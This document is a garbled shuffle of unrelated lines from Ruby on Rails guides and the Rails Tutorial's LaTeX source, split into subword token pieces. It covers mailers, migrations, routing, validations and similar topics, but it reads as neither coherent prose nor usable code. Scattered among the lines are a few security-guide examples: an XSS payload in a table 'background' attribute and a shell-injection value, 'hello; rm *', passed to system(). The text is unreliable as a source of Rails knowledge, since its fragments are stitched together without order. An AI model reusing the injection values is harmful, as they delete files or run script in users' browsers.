▁In ▁analogy ▁with ▁the ▁account ▁activation ▁mailer ▁method ▁test ▁( Listing ~\ ref { code : real _ account _ activation _ test }), ▁we ' ll ▁write ▁a ▁short ▁test ▁of ▁the ▁password ▁reset ▁mailer ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test } .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁set , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁ Example ▁of ▁vulnerable ▁code ▁that ▁could ▁be ▁used ▁by ▁attacker , ▁if ▁` deep _ munge `╼ w as n ' t ▁perform ed ▁is :
▁class ▁ Base
▁$ ▁ cd ▁rails
▁### ▁For k
▁There ▁are ▁many ▁\ href { http :// dev center ▖ heroku ▖ com / heroku - command } { Heroku ▁commands }, ▁and ▁we ' ll ▁bar e ly ▁scratch ▁the ▁ s ur fa ce ▁in ▁this ▁book .
▁To ▁render ▁content ▁into ▁a ▁named ▁` yield `, ▁you ▁use ▁the ▁` content _ for ` ▁method .
▁In ▁particular , ▁you ▁can ▁specify ╼ in div id u al ▁files ▁and ▁they ▁are ▁ compiled ▁in ▁the ▁order ▁specified ▖
▁#### ▁S end ing ▁E mail ▁With ▁Name
▁Pass ▁a ▁`: separator ` ▁to ▁ truncate ▁the ▁string ▁at ▁a ▁natural ▁break :
▁ Addi tion s ▁to ▁the ▁default ▁\ k ode { Guardfile } .
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : unicorn _ config } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile ▖ lock } :
▁By ▁ having ▁ isolate d ▁routes ▁such ▁as ▁this , ▁if ▁you ▁wish ▁to ▁link ▁to ▁an ▁are a ▁of ▁an ╼ engine ▁from ▁within ▁an ▁application , ▁you ▁will ▁need ▁to ▁use ▁the ▁engine ' s ▁routing ╼ proxy ▁method ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ unfollow _ test } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / conversions ▖ rb ` .
▁in ▁Listing ~\ ref { code : branch _ raise } .
▁config ▖ middleware ▖ delete ▁" Rack :: MethodOverride "
▁in ▁Listing ~\ ref { code : micropost _ partial _ with _ delete } ▁and
▁Active ▁Record ▁gives ▁us ▁sever al ▁ mechanism s , ▁the ▁most ▁important ▁being ▁the ▁ability ╼ to :
▁This ▁will ▁send ▁the ▁supplied ▁string ▁to ▁the ▁browser ▁with ▁a ▁ MIME ▁type ▁of ▁` text / javascript ` .
▁The ▁migration ▁itself ▁consist s ▁of ▁a ▁\ k ode { change } ▁method ▁that ▁determine s ▁the ▁change ▁to ▁be ▁made ▁to ▁the ▁database .
▁WARNING ▖ ▁If ▁the ▁collection ▁is ▁empty ▁the ▁root ▁element ▁is ▁by ▁default ▁" nil - classes "▖
▁render ▁"/ path / to / rails / app / views / books / edit ▖ html ▖ erb "
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signin _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action } .
▁However , ▁even ▁that ▁version ▁has ▁[ some ▁security ▁bug s ]( http :// www ▖ r or security ▖ info / j our n al / 2008 / 10 /1 3 / new - r ed c lo th - security ▖ html ), ▁so ▁the ▁countermeasure s ▁ still ▁apply ▖
▁# ▁config ▖ action _ dispatch ▖ x _ send file _ header ▁= ▁" X - Sendfile " ▁# ▁for ▁ Apache
▁### ▁S pe cial ▁T re at ment ▁for ▁ Security ▁ Issue s
▁#### ▁stylesheet _ link _ tag
▁Code ▁for ▁a ▁ proposed ▁Contact ▁page .
▁You ▁may ▁note ▁that , ▁unlike ▁the ▁ demo ▁Users ▁and ▁Microposts ▁controllers ▁from ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁Static ▁Pages ▁controller ▁does ▁not ▁use ▁the ▁standard ▁REST ▁actions .
▁cause s ▁Guard ▁to ▁use ▁the ▁ Spring ▁server ▁supplied ▁by ▁Rails ▁to ▁ speed ▁up ▁loading ▁time s , ▁while ▁also ▁ preventing ▁Guard ▁from ▁running ▁the ▁full ▁test ▁suite ▁upon ▁starting .
▁create ▁app / controllers / blorgh / articles _ controller ▖ rb
▁* ▁You ▁could ▁use ▁a ▁` before _ action ` ▁to ▁ populate ▁the ▁mail ▁object ▁with ▁defaults ,╼ ▁ delivery _ method _ options ▁or ▁insert ▁default ▁headers ▁and ▁ attachments .
▁create ▁test / models / micropost _ test ▖ rb
▁#### # ▁` uniq `
▁ rescue ▁ NameError ▁=> ▁e
▁The ▁migration ▁to ▁add ▁the ▁attributes ▁from ▁Figure ~\ ref { fig : user _ model _ password _ reset } ▁appears ▁as ▁follows :
▁Let ' s ▁get ▁the ▁rest ▁of ▁the ▁user ▁edit ▁functionality ▁working ▁as ▁well .
▁Even ▁at ▁this ▁ early ▁stage , ▁we ' re ▁already ▁going ▁to ▁deploy ▁our ▁( nearly ▁empty ) ▁Rails ▁application ▁to ▁production .
▁in ▁Listing ~\ ref { code : generate _ user _ mailer } .
▁On ▁the ▁other ▁hand , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : invalid _ submission _ no _ feed back }, ▁it ▁doesn ' t ▁display ▁any ▁feedback ▁on ▁invalid ▁submission s ▁( a part ▁from ▁the ▁development - only ▁debug ▁are a ), ▁which ▁is ▁ potentially ▁confusing .
▁When ▁you ▁do ▁a ▁lot ▁of ▁programming , ▁you ▁quickly ▁learn ▁that ▁one ▁of ▁the ▁most ▁common ▁bit s ▁of ▁control ▁ flow ▁go es ▁something ▁like ▁this :
▁followers
▁The ▁first ▁highlight ed ▁line ▁in ▁Listing ~\ ref { code : find _ authenticate _ user } ▁pull s ▁the ▁user ▁out ▁of ▁the ▁database ▁using ▁the ▁submitted ▁email ▁address .
▁You ▁can ▁use ▁any ▁of ▁the ▁standard ▁[ query ing ▁methods ]( active _ record _ query ing ▖ html ) ▁inside ▁the ▁scope ▁block ▖
▁* ▁`: source _ type `
▁Let ' s ▁write ▁tests ▁to ▁arrange ▁that .
▁` the ruby r hi no ` ▁is ▁the ▁recommended ▁run time ▁for ▁JRuby ▁users ▁and ▁is ▁added ▁by ╼ default ▁to ▁the ▁` Gemfile ` ▁in ▁app s ▁generated ▁under ▁JRuby ▖
▁In tr o duction ▁to ▁Rack
▁Fin ally , ▁our ▁class ▁defines ▁a ▁method ▁called ▁\ k ode { formatted \_ email } ▁that ▁uses ▁the ▁values ▁of ▁the ▁as signed ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁variables ▁to ▁build ▁up ▁a ▁nicely ▁ formatted ▁version ▁of ▁the ▁user ' s ▁email ▁address ▁using ▁string ▁inter p ol ation ▁( Section ~\ ref { sec : string s }) :
▁A ▁resource ▁route ▁map s ▁a ▁number ▁of ▁related ▁requests ▁to ▁actions ▁in ▁a ▁single ▁controller .
▁* ▁testing ▁environment :
▁** app / views / layouts / application ▖ html ▖ erb **
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / to _ param ▖ rb ` .
▁You ' re ▁on ▁your ▁branch ▁now , ▁so ▁you ▁can ▁write ▁what ever ▁you ▁want ▁( make ▁sure ▁you ' re ▁on ▁the ▁right ▁branch ▁with ▁` git ▁branch ▁- a ` )▖
▁We ▁start ▁by ▁changing ▁the ▁format ▁from ▁ RDoc ▁to ▁ Markdown :
▁=> ▁true
▁The ▁` object ` ▁option ▁can ▁be ▁used ▁to ▁directly ▁specify ▁which ▁object ▁is ▁rendered ▁into ▁the ▁partial ; ▁useful ▁when ▁the ▁template ' s ▁object ▁is ▁else where ▁( eg ▖ ▁in ▁a ▁different ▁instance ▁variable ▁or ▁in ▁a ▁local ▁variable ) .
▁On ce ▁we ▁have ▁made ▁the ▁new ▁comment , ▁we ▁send ▁the ▁user ▁back ▁to ▁the ▁original ▁article ╼ using ▁the ▁` article _ path (@ article ) ` ▁helper ▖
▁If ▁true ▁then ▁any ▁error ▁will ▁cause ▁ detailed ▁debugging ▁information ▁to ▁be ▁ dump ed ▁in ▁the ▁HTTP ▁response , ▁and ▁the ▁` Rails :: In fo ` ▁controller ▁will ▁show ▁the ▁application ▁run time ▁context ▁in ▁` / rails / info / properties ` ▖
▁The ▁following ▁example ▁will ▁yield ▁to ▁the ▁supplied ▁block ▁an ▁array ▁of ▁up ▁to ▁1 000 ▁ invoices ▁at ▁a ▁time , ▁with ▁the ▁final ▁block ▁containing ▁any ▁re main ing ▁ invoices :
▁( B y ▁the ▁way , ▁all ▁of ▁these ▁methods --- \ k ode { count }, ▁\ k ode { empty ?} , ▁and ▁\ k ode { any ?} --- work ▁on ▁Ruby ▁arrays ▁as ▁well .
▁NOTE : ▁ Mail ▁will ▁automatically ▁ Base 64 ▁ en code ▁an ▁ attachment ▖
▁The ▁purpose ▁of ▁\ k ode { current \_ user } ▁is ▁to ▁allow ▁construction s ▁such ▁as
▁With ▁this ▁declaration , ▁Rails ▁will ▁keep ▁the ▁cache ▁value ▁up ▁to ▁date , ▁and ▁then ▁return ▁that ▁value ▁in ▁response ▁to ▁the ▁` size ` ▁method .
▁#### ▁A ▁note ▁about ▁ media ▁types
▁ Writ ing ▁it ▁will ▁ o cc up y ▁the ▁rest ▁of ▁this ▁section .
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost .
▁ _ user _ objects ▁( end )╼╼ ▁\ subsection { Updating ▁user ▁objects } ▁% ▁( fold )╼ ▁\ label { sec : updating _ user _ objects }╼╼
▁Rails ▁is ▁attempt ing ▁to ▁find ▁a ▁template ▁called ╼` articles / new ` ▁within ▁` app / views ` ▁for ▁the ▁application ▖
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁class _ name : ▁" G ad get "
▁The ▁` rake ▁db : migrate ` ▁command ▁needs ▁to ▁be ▁run ▁here ▁to ▁ensure ▁that ▁our ╼ application ▁has ▁the ▁` users ` ▁table ▁for ▁future ▁use .
▁We ▁can ▁get ▁the ▁routing ▁for ▁ / users /1 ▁to ▁work ▁by ▁adding ▁a ▁single ▁line ▁to ▁our ▁routes ▁file ▁(\ k ode { config / routes ▖ rb }) :
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" N E ST E D "=>{" A " => 3 , ▁"5" => 5}}
▁The ▁method ▁also ▁accept s ▁options ▁like ▁`: dasherize ` ▁and ▁f ri end s , ▁they ▁are ▁forward ed ▁to ▁the ▁ builder .
▁To get her , ▁these ▁commands ▁combine ▁ RVM ▁and ▁Bundler ▁magic ▁to ▁ensure ▁that ▁commands ▁such ▁as ▁\ k ode { rake } ▁and ▁\ k ode { rspec } ▁are ▁automatically ▁executed ▁in ▁the ▁right ▁environment .
▁Before ▁proceeding , ▁be ▁sure ▁to ▁commit ▁and ▁merge ▁your ▁changes ▁if ▁you ' re ▁using ▁Git ▁for ▁version ▁control :
▁A ▁\ k ode { create } ▁action ▁that ▁can ▁handle ▁signup ▁failure ▁( but ▁not ▁ success ) .
▁if ▁@ article ▖ save
▁In ▁list s ▁of ▁options , ▁parameters , ▁etc ▖ ▁use ▁a ▁hyphen ▁between ▁the ▁item ▁and ▁its ▁ description ▁( read s ▁better ▁than ▁a ▁ col on ▁because ▁normal ly ▁options ▁are ▁symbols ) :
▁### ▁ Example ▁Action ▁Mailer ▁Configuration
▁Here ' s ▁the ▁development ▁section :
▁This ▁is ▁because ▁Rails ▁automatically ▁infer s ▁from ▁\ k ode { redirect \_ to ▁@ user } ▁that ▁we ▁want ▁to ▁redirect ▁to ▁\ k ode { user \_ url (@ user )} .
▁as ▁seen ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ email } .
▁Note ▁that ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ pg _ gem } .
▁It ' s ▁reason able ▁to ▁as k ▁why ▁we ▁should ▁re in v ent ▁the ▁ w h e el .
▁ / log /* ▖ log
▁Active ▁Job ▁is ▁a ▁framework ▁for ▁declar ing ▁job s ▁and ▁making ▁them ▁run ▁on ▁a ▁variety ╼ of ▁ queue ing ▁back end s ▖
▁* ▁If ▁` value ` ▁respond s ▁to ▁` to _ xml ` ▁the ▁method ▁is ▁invoke d ▁with ▁` key ` ▁as ▁`: root ` .
▁In ▁this ▁section , ▁we ' ll ▁write ▁one ▁such ▁test ▁to ▁verify ▁the ▁correct ▁behavior ▁upon ▁invalid ▁form ▁submission ; ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission }, ▁we ' ll ▁write ▁a ▁corresponding ▁test ▁for ▁valid ▁submission .
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁articles ▁| ▁ ALL ▁| ▁NULL ▁|
▁user ▁= ▁User ▖ find _ by ( name : ▁' David ')
▁* ▁`: last _ word _ connect or `: ▁What ▁is ▁used ▁to ▁join ▁the ▁last ▁ items ▁of ▁an ▁array ▁with ▁3 ▁or ▁more ▁elements ▖
▁To ▁use ▁this ▁generator , ▁open ▁a ▁terminal , ▁navigate ▁to ▁a ▁directory ▁where ▁you ▁have ╼ right s ▁to ▁create ▁files , ▁and ▁type :
▁### ▁P age ▁Change ▁Even t s
▁We ▁reuse ▁the ▁` article _ params ` ▁method ▁that ▁we ▁defined ▁earlier ▁for ▁the ▁create ╼ action .
▁30 2▖2 4 3 9 89 2 34 23 ▖ to _ s (: percentage , ▁ precision : ▁5 )
▁to ▁verify ▁that ▁our ▁code ▁is ▁now ▁Re d ▁( failing ▁tests ) .
▁A ▁ summary ▁of ▁the ▁default ▁Rails ▁files ▁appears ▁in ▁Table ~\ ref { table : rails _ directory _ structure } ; ▁we ' ll ▁learn ▁about ▁most ▁of ▁these ▁files ▁and ▁directories ▁throughout ▁the ▁rest ▁of ▁this ▁book .
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement ; ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well .
▁In ▁particular , ▁for ▁this ▁third ▁ edition ▁I ▁a m ▁please d ▁to ▁part n er ▁with ▁ Cloud 9 ▁to ▁offer ▁a ▁development ▁environment ▁specifically ▁tailor ed ▁to ▁the ▁needs ▁of ▁this ▁tutorial .
▁Note ▁here ▁the ▁hidden ▁input ▁field
▁Development ╼ m ode ▁will ▁work ▁as ▁expected .
▁As ▁usual , ▁if ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁make ▁a ▁new ▁branch :
▁create ▁app / views / microposts / new ▖ html ▖ erb
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` belongs _ to ` ▖
▁As ▁in ▁previous ▁chapter s , ▁we ▁will ▁find ▁it ▁convenient ▁to ▁use ▁the ▁ seed ▁data ▁Rake ▁task ▁to ▁fill ▁the ▁database ▁with ▁sample ▁relationships .
▁errors [: name ] ▁= ▁" cannot ▁contain ▁the ▁characters ▁ !
▁The ▁application ▁sign s ▁users ▁out ▁by ▁ deleting ▁the ▁session ' s ▁user ▁id ▁and ▁remov ing ▁the ▁ permanent ▁cookie ▁from ▁the ▁browser .
▁You ▁can ▁use ▁the ▁` errors ▖ full _ messages ` ▁or ▁` errors ▖ to _ a ` ▁methods ▁to ▁view ▁the ▁messages ▁in ▁the ▁form ▁they ▁m ight ▁be ▁displayed ▁to ▁a ▁user ▖
▁* ▁Access - Control - Allow - O ri g in
▁A lthough ▁we ▁could ▁use ▁SSL ▁on ▁just ▁the ▁signup ▁page , ▁it ' s ▁actually ▁easier ▁to ▁implement ▁it ▁site - wide , ▁which ▁has ▁the ▁ additional ▁benefit s ▁of ▁ sec ur ing ▁user ▁login ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) ▁and ▁making ▁our ▁application ▁ im m un e ▁to ▁a ▁ critical ▁\ emph { session ▁hijacking } ▁ vulnerabilit y ▁discuss ed ▁in ▁Section ~\ ref { sec : remember _ me } .
▁resources ▁: photos
▁The ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁\ k ode { attr \_ accessor } ▁to ▁create ▁an ▁ accessible ▁attribute , ▁which ▁we ▁saw ▁before ▁in ▁Section ~\ ref { sec : a _ user _ class } :
▁An a log ous ly ▁to ▁` DateTime `, ▁the ▁ predicate s ▁` past ?` , ▁and ▁` future ?` ▁are ▁relative ▁to ▁` Time ▖ current ` .
▁### ▁config / environments / test ▖ rb
▁encoding : ▁ uni code
▁The ▁ core ▁of ▁this ▁test ▁is ▁the ▁expect ation ▁that ▁the ▁following ▁and ▁ follower ▁count s ▁appear ▁on ▁the ▁page , ▁together ▁with ▁the ▁right ▁URLs :
▁A ▁profile ▁with ▁an ▁ unfollow ▁button ▁and ▁ increment ed ▁followers ▁count .
▁**` ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware ` **
▁But ▁you ▁don ' t ▁have ▁to ▁do ▁everything ╼ with out ▁help ▖
▁Client ▖ count
▁Noti ce ▁that ▁only ▁ _ one _ ▁migration ▁was ▁copie d ▁over ▁here ▖
▁The ▁new ▁record ▁m ight ▁not ▁be ▁saved ▁to ▁the ▁database ; ▁that ▁depend s ▁on ▁whether ▁validations ▁passed ▁or ▁not ▁( just ▁like ▁` create ` ) .
▁The ▁order ▁here ▁is ▁\ k ode { ' created \_ at ▁DESC ' }, ▁where ▁\ k ode { D E S C } ▁is ▁SQL ▁for ▁`` desc end ing '' , ▁i ▖ e ▖ , ▁in ▁ desc end ing ▁order ▁from ▁new est ▁to ▁old est .
▁This ▁code ▁contains ▁an ▁SQL ▁ subselect , ▁and ▁internally ▁the ▁entire ▁select ▁for ▁user ~ 1 ▁would ▁look ▁something ▁like ▁this :
▁( As ▁in ▁Section ~\ ref { sec : planning _ the _ application }, ▁note ▁that ▁users ▁of ▁the ▁cloud ▁IDE ▁can ▁create ▁this ▁project ▁in ▁the ▁same ▁ workspace ▁as ▁the ▁applications ▁from ▁the ▁previous ▁two ▁chapter s .
▁digest
▁validates ▁: email , ▁confirmation : ▁true
▁< table ▁background =" javascript : alert (' Hello ') ">
▁T ry ing ▁them ▁both ▁re ve al s ▁that ▁the ▁latter ▁works .
▁\ emph { Extra ▁ credit } : ▁ Show ▁that ▁Rails ▁supports ▁non - \ href { http :// es ▖ w ikipedia ▖ org / wiki / ASCII } { ASCII } ▁characters ▁by ▁including ▁an ▁in ve r ted ▁excl a m ation ▁point , ▁as ▁in ▁`` ¡ H ol a , ▁ mundo !'' ▁( Figure ~\ ref { fig : hola _ mundo })
▁NOTE : ▁ Make ▁sure ▁your ▁ queue ing ▁back end ▁" list en s " ▁on ▁your ▁ queue ▁name ▖
▁S ol u tion s ▁M an u al ▁for ▁E x er ci s es
▁By ▁far ▁the ▁two ▁most ▁popular ▁site s ▁for ▁host ing ▁Git ▁repositories ▁are ▁GitHub ▁and ▁Bitbucket .
▁Rails ▁ Contribut or s
▁In st all ▁ spring ▁using ▁` bundle ▁install ` .
▁For ▁example , ▁the ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { source ▁code } ▁of ▁\ k ode { has \_ secure \_ password } ▁make s ▁this ▁mistake , ▁as ▁did ▁the ▁first ▁two ▁ edition s ▁of ▁this ▁tutorial .
▁# ▁=> ▁[" cannot ▁contain ▁the ▁characters ▁ !
▁By ▁design , ▁the ▁ bcrypt ▁algorithm ▁produce s ▁a ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / S alt _ ( crypt o gr a ph y )} { s alt ed ▁hash }, ▁which ▁protect s ▁again st ▁two ▁important ▁classes ▁of ▁attacks ▁(\ href { https :// en ▖ w ikipedia ▖ org / wiki / D ic tion ary _ a tt ac k } { dictionary ▁attacks } ▁and ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / R a in bo w _ table } { ra in bo w ▁table ▁attacks }) .
▁This ▁is ▁because ▁using ▁the ▁new er ▁syntax ▁to ▁write
▁The ▁method ▁` stringify _ keys ` ▁returns ▁a ▁hash ▁that ▁has ▁a ▁ stringified ▁version ▁of ▁the ▁keys ▁in ▁the ▁receiver ▖
▁- ▁[ Apache ]( https :// t n 123 ▖ org / mod _ x send file / )
▁ Go ▁a head ▁and ▁run ▁the ▁migration :
▁The ▁reason ▁this ▁works ▁is ▁that ▁the ▁\ k ode { change } ▁method ▁know s ▁that ▁\ k ode { drop \_ table } ▁is ▁the ▁ inverse ▁of ▁\ k ode { create \_ table }, ▁which ▁means ▁that ▁the ▁ rollback ▁migration ▁can ▁be ▁easily ▁inferred .
▁" It ▁work ed !"
▁ { c : ▁3 , ▁b : ▁2, ▁a : ▁1 } ▖ to _ query ▁# ▁=> ▁" a = 1 & b = 2 & c = 3 "
▁The ▁functionality ▁will ▁be ▁ u tt er ly ▁under - developed , ▁and ▁many ▁of ▁the ▁steps ▁will ▁seem ▁like ▁magic , ▁but ▁worry ▁not : ▁the ▁full ▁sample ▁app ▁will ▁develop ▁a ▁similar ▁application ▁from ▁the ▁ gr ound ▁up ▁starting ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁and ▁I ▁will ▁provide ▁p l ent i ful ▁forward - references ▁to ▁later ▁material .
▁+ - --- +-------------+ - ------+-------+ --------------- +
▁" John ▁S m i th "▖ parameterize ▁# ▁=> ▁" j o h n - s m i th "
▁we ▁can ▁access ▁` field _ error _ proc ` ▁in ▁views .
▁U nfortunately , ▁this ▁means ▁that ▁creating ▁users ▁can ▁ bo g ▁down ▁the ▁test ▁suite ; ▁h app ily , ▁there ▁is ▁an ▁easy ▁fix .
▁Then ▁reset ▁the ▁database :
▁The ▁result ing ▁correspond ence ▁of ▁URLs , ▁actions , ▁and ▁named ▁routes ▁is ▁show n ▁in ▁Table ~\ ref { table : RESTful _ users } .
▁D O C TYPE ▁ html >
▁I ' d ▁also ▁like ▁to ▁than k ▁De b ra ▁Wi ll ia m s ▁C a ul e y , ▁my ▁editor ▁on ▁both ▁\ emph { RailsSpace } ▁and ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ; ▁as ▁long ▁as ▁ sh e ▁keep s ▁tak ing ▁me ▁to ▁base b all ▁g a me s , ▁I ' ll ▁keep ▁writing ▁ books ▁for ▁ her .
▁render ▁ body : ▁" raw "
▁Configur able ▁with ▁` config ▖ action _ dispatch ▖ x _ send file _ header ` .
▁<%= ▁ auto _ discover y _ link _ tag (: rs s , ▁ { action : ▁" feed " },
▁This ▁uses ▁the ▁ html - s can n er ▁token ize r ▁and ▁so ▁its ▁HTML ▁pa rs ing ▁ability ▁is ▁ limited ▁by ▁that ▁of ▁ html - s can n er .
▁def ▁self ▖ author _ class
▁### ▁ FormTagHelper
▁" Home "
▁create ▁app / assets / stylesheets / microposts ▖ css ▖ scss
▁has _ many ▁: read ing s
▁The ▁\ k ode { Microposts Controller } ▁class , ▁highlight ing ▁inheritance .
▁ Third - part y ▁code ▁such ▁as ▁plugin s ▁and ▁gems
▁S t ru c t ur ing ▁Layouts
▁class _ attribute ▁: default _ params
▁Now ▁all ▁of ▁the ▁following ▁will ▁produce ▁the ▁expected ▁join ▁queries ▁using ▁` INNER ▁JOIN `:
▁The ▁users ▁index ▁with ▁delete ▁links .
▁Rails ▁routing ▁supports ▁nested ▁routes .
▁Ruby ▁supports ▁object ▁inheritance .
▁system (" / bin / echo "," hello ; ▁ rm ▁* ")
▁Here ▁we ' re ▁using ▁` link _ to ` ▁in ▁a ▁different ▁way ▖
▁For ▁example , ▁suppose ▁you ▁have ▁some ▁" expert " ▁users ▁that ▁should ▁see ▁different ▁pages ▁from ▁" normal " ▁users ▖
▁Rails ▁provides ▁quite ▁a ▁bit ▁of ▁built - in ▁support ▁for ▁build ing ▁web ▁pages ▁with ▁this ╼ tech n i q ue ▖
▁In ▁this ▁section , ▁we ▁will ▁implement ▁the ▁basic ▁interface ▁and ▁following / unfollow ing ▁functionality ▁show n ▁in ▁those ▁mockup s .
▁In ▁this ▁case ▁it ▁will ▁look ▁for ▁templates ▁at ▁` app / views / notification s ` ▁with ▁name ╼` another ` ▖
▁Tests ▁for ▁the ▁post - save ▁behavior ▁in ▁the ▁\ k ode { create } ▁action .
▁=> ▁[ 17 , ▁ 8, ▁42 ]
▁For ▁those ▁ familiar ▁with ▁JavaScript , ▁this ▁functionality ▁is ▁compar able ▁to ▁using ▁a ▁built - in ▁class ▁ proto type ▁object ▁to ▁ augment ▁the ▁class .
▁You ▁can ▁also ▁use ▁` any ?` ▁and ▁` many ?` ▁to ▁check ▁for ▁exist ence ▁on ▁a ▁model ▁or ▁relation .
▁ SCSS ▁for ▁styling ▁the ▁user ▁show ▁page , ▁including ▁the ▁ sidebar .
▁If ▁you ▁are ▁sure ▁you ▁will ▁not ▁sub template ▁the ▁` New s ` ▁layout , ▁you ▁can ▁replace ▁the ▁` content _ for ?( : new s _ content ) ▁? ▁yield (: new s _ content ) ▁: ▁yield ` ▁with ▁simply ▁` yield ` .
▁ _ It ▁is ▁very ▁important ▁to ▁filter ▁ malicious ▁input , ▁but ▁it ▁is ▁also ▁important ▁to ▁escape ▁the ▁output ▁of ▁the ▁web ▁application _ .
▁% w (▖ js ▁ ▖ css )▖ include ?(
▁To ▁change ▁defaults ▁for ▁multiple ▁uses , ▁for ▁example ▁adding ▁table ▁tags ▁to ▁the ▁default :
▁Now ▁people ▁will ▁only ▁need ▁to ▁go ▁to ▁the ▁root ▁of ▁the ▁engine ▁to ▁see ▁all ▁the ▁articles ,╼ ra the r ▁than ▁visit ing ▁` / articles ` ▖
▁number _ with _ precision ( 111▖2345 , ▁2 ) ▁# ▁=> ▁111▖23
▁# ▁Generate s ▁a ▁date ▁select ▁that ▁defaults ▁to ▁the ▁date ▁provided ▁( s i x ▁day s ▁after ▁ today )
▁At ▁this ▁point , ▁you ▁should ▁verify ▁that ▁you ▁can ▁sign ▁in , ▁close ▁the ▁browser , ▁and ▁then ▁ still ▁be ▁signed ▁in ▁when ▁you ▁visit ▁the ▁sample ▁application .
▁Because ▁the ▁\ k ode { gravatar \_ for } ▁method ▁is ▁undefined , ▁the ▁user ▁show ▁view ▁is ▁current ly ▁broken .
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" is ▁not ▁included ▁in ▁the ▁list " _ .
▁In ▁this ▁section , ▁we ' ll ▁write ▁a ▁short ▁integration ▁test ▁for ▁some ▁of ▁the ▁other ▁elements ▁on ▁the ▁profile ▁page , ▁including ▁the ▁work ▁from ▁this ▁section .
▁This ▁validation ▁is ▁very ▁specific ▁to ▁web ▁applications ▁and ▁this ╼ ' acceptance ' ▁does ▁not ▁need ▁to ▁be ▁record ed ▁any where ▁in ▁your ▁database ▁( if ▁you ╼ d on ' t ▁have ▁a ▁field ▁for ▁it , ▁the ▁helper ▁will ▁just ▁create ▁a ▁virtual ▁attribute ) .
▁* ▁` association ( force _ reload ▁= ▁false ) `
▁-------------- ----------------
▁Header ▁un set ▁ ETag
▁### ▁Using ▁N est ed ▁Layouts
▁| ▁| ▁4 16 ▁| ▁: request ed _ range _ not _ satisf i able ▁|
▁One ▁of ▁these ▁is ▁the ▁new ▁application ▁generator ,╼ which ▁will ▁provide ▁you ▁with ▁the ▁foundation ▁of ▁a ▁fresh ▁Rails ▁application ▁so ▁that ╼ you ▁don ' t ▁have ▁to ▁write ▁it ▁yourself .
▁class ▁B ▁< ▁A ; ▁end
▁and ▁replace ▁it ▁with
▁The ▁` i nclusion ` ▁helper ▁has ▁an ▁option ▁`: in ` ▁that ▁receive s ▁the ▁set ▁of ▁values ▁that ╼ will ▁be ▁accepted ▖
▁So on er ▁or ▁later , ▁most ▁Rails ▁developers ▁will ▁see ▁the ▁error ▁message ▁" C an ▁only ▁render ▁or ▁redirect ▁once ▁per ▁action "▖
▁allows ▁Rails ▁to ▁infer ▁that ▁the ▁\ k ode { action } ▁of ▁the ▁form ▁should ▁be ▁to ▁\ text tt { POST } ▁to ▁the ▁URL ▁ / users , ▁in ▁the ▁case ▁of ▁sessions ▁we ▁need ▁to ▁indicate ▁the ▁\ emph { name } ▁of ▁the ▁resource ▁and ▁the ▁corresponding ▁URL
▁A ▁particular ly ▁useful ▁trick ▁is ▁to ▁use ▁the ▁index ▁- 1 ▁at ▁the ▁end ▁of ▁the ▁ range ▁to ▁select ▁every ▁element ▁from ▁the ▁starting ▁point ▁to ▁the ▁end ▁of ▁the ▁array ▁\ emph { with out } ▁explicitly ▁ having ▁to ▁use ▁the ▁array ' s ▁length :
▁So ▁far , ▁the ▁Sessions ▁controller ▁actions ▁have ▁followed ▁the ▁RESTful ▁convention ▁of ▁using ▁\ k ode { new } ▁for ▁a ▁login ▁page ▁and ▁\ k ode { create } ▁to ▁complete ▁the ▁login .
▁### ▁B i - d i re ctional ▁Associations
▁* ▁How ▁to ▁load ▁all ▁extensions .
▁A ▁test ▁for ▁rendering ▁the ▁feed ▁on ▁the ▁Home ▁page .
▁The ▁syntax ▁is ▁simple , ▁rely ing ▁on ▁Ruby ▁blocks ▁and ▁custom ▁methods ▁to ▁define ▁the ▁attributes ▁of ▁the ▁desired ▁object .
